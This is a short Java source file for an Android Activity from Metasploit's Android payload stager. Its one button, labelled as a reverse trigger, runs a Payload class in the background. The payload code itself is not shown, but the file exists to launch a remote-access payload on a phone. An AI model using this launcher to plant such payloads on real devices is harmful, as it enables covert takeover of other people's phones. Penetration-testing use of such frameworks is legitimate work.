package com.metasploit.stage;

import android.app.Activity;
import android.os.AsyncTask;
import android.os.Bundle;
import android.view.View;
import android.view.View.OnClickListener;

public class MainActivity extends Activity
{
    @Override
    public void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);

        findViewById(R.id.button_reverse).setOnClickListener(new OnClickListener() {
            @Override
            public void onClick(View v) {
                startAsync();
            }
        });
    }

    private void startAsync() {
        new AsyncTask<Void, Void, Void>() {
            @Override
            protected Void doInBackground(Void... params) {
                startPayload();
                return null;
            }
        }.execute();
    }

    private void startPayload() {
        try {
            System.setProperty("user.dir", getFilesDir().getAbsolutePath());
            Payload.context = this;
            Payload.main(null);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
